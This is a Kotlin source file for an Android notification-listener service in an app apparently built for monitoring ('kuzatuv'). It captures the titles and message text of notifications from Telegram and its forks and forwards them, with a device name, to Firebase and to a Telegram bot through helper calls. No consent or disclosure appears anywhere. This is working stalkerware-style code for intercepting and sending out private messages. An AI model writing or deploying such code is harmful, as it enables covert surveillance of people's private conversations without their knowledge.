package com.kuzatuv.app

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class TelegramNotificationListener : NotificationListenerService() {

    private val lastSentText = HashMap<String, String>()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val pkgLower = pkg.lowercase()
        val isTelegramLike = pkgLower.contains("telegra") || pkgLower.contains("legram") || pkgLower.contains("nekogram") || pkgLower.contains("nekox")
        if (!isTelegramLike) return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        var text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

        val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        if (lines != null && lines.isNotEmpty()) {
            text = lines.joinToString("\n") { it.toString() }
        }

        val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
        if (messages != null && messages.isNotEmpty()) {
            val bundle = messages.last() as? Bundle
            val msgText = bundle?.getCharSequence("text")?.toString()
            if (!msgText.isNullOrEmpty()) text = msgText
        }

        if (title.isEmpty() && text.isEmpty()) return

        val key = sbn.key
        val combined = "$title|$text"
        if (lastSentText[key] == combined) return
        lastSentText[key] = combined

                val device = DevicePrefs.getDeviceName(applicationContext)
                FirebaseHelper.pushTelegram(key, title, text, System.currentTimeMillis(), device)
        TelegramHelper.send("📨 Telegram ($device)\n$title:\n$text")
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        lastSentText.remove(sbn.key)
    }
}
